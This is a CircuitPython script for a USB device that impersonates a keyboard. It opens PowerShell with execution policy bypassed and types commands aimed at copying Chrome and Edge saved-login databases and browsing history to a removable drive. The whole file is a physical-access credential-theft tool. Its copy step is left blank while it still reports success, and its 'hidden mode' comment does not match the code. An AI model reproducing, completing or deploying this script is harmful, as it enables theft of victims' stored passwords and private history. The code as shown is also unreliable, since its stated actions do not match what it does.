import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# Initialize HID keyboard
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)

time.sleep(5)  # Wait to avoid startup issues

# Open PowerShell in hidden mode
kbd.send(Keycode.GUI, Keycode.R)
time.sleep(0.5)
layout.write("powershell -ExecutionPolicy Bypass -NoProfile\n")
time.sleep(1)

time.sleep(0.5)

# PowerShell script for copying Chrome & Edge data
cmd = """
$chromeLoginData = "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/Login Data";
$chromeHistory = "$env:USERPROFILE/AppData/Local/Google/Chrome/User Data/Default/History";
$edgeLoginData = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Login Data";
$edgeHistory = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/History";

# Destination paths (ensured correct drive mapping)
$chromeLoginDataDest = " E:\\data\\login_data_chrome";
$chromeHistoryDest = " E:\\data\\browser_history_chrome";
$edgeLoginDataDest = " E:\\data\\login_data_edge";
$edgeHistoryDest = " E:\\data\\browser_history_edge";

Start-Sleep -Seconds 1

# Copy Chrome login data & history




Write-Host "Chrome and Edge data copied successfully to E:\\data."
"""

layout.write(cmd + "\n")
time.sleep(5)

# Exit PowerShell
layout.write("exit\n")
